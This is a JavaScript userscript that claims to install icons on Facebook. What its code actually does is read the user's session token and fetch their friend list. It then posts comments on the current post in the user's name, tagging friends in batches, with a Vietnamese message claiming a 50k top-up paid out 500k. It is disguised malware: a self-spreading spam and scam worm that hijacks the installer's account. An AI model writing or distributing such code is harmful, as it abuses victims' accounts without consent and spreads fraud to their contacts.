// ==UserScript==
// @name            Cài d?t ICON tr?c ti?p trên FaceBook 2014 (y)
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
function x__0() {
  return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest
}

function get_friends() {
  var a = x__0();
  if (a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer=" + uid + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", !1), a.send(null), 4 == a.readyState) {
    var b = JSON.parse(a.responseText.substring(a.responseText.indexOf("{")));
    return b.payload.entries
  }
  return !1
}

function x__0() {
  return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest
}

function get_friends() {
  var a = x__0();
  if (a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer=" + uid + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", !1), a.send(null), 4 == a.readyState) {
    var b = JSON.parse(a.responseText.substring(a.responseText.indexOf("{")));
    return b.payload.entries
  }
  return !1
}

function get_uid(a) {
  var b = x__0();
  return b.open("GET", "http://graph.facebook.com/" + a, !1), b.send(), 4 == b.readyState ? uid = JSON.parse(b.responseText)
    .id : !1
}
var patt = /comment_text=(.*?)&/,
  c = 1;
username = /\.com\/(.*?)\//.exec(window.top.location)[1], uid = get_uid(username), a = window.top.location, termina = 0;
var amigos = get_friends();
post_id = /[0-9]{8,}/.exec(a), uids = "comment_text=Mình là thành công rồi.Mình vừa nạp 50k..thế là đc 500k..ths bạn nhé <3%20", header = "ft_ent_identifier=" + post_id + "&comment_text=0&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user=" + uid + "&__a=1&__req=4u&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&phstamp=" + Math.random();
for (var n = 1; n < amigos.length; n++)
  if (fb_dtsg = document.getElementsByName("fb_dtsg")[0].value, uids += "%40[" + amigos[n].uid + "%3AAAAAAAAAAAA]%20", c++, 7 == c) {
    with(uids += "&", new XMLHttpRequest) open("POST", "/ajax/ufi/add_comment.php?__a=1"), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), send(header.replace(patt, uids));
    z = setTimeout("function(){asd=0}", 1e3), clearInterval(z), c = 1, uids = "comment_text=Mình là thành công rồi.Mình vừa nạp 50k..thế là đc 500k..ths bạn nhé <3%20"
  }